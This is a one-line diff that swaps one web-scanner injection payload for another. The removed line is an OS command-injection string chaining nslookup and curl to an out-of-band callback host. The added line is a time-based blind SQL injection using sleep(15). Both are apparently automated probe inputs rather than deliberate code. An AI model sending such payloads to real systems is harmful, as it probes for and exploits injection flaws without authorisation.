@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitovcpitbkcxa655d.bxss.me||curl hitovcpitbkcxa655d.bxss.me)|(nslookup -q=cname hitovcpitbkcxa655d.bxss.me||curl hitovcpitbkcxa655d.bxss.me)&(nslookup -q=cname hitovcpitbkcxa655d.bxss.me||curl hitovcpitbkcxa655d.bxss.me)
+5550'XOR(555*if(now()=sysdate(),sleep(15),0))XOR'Z
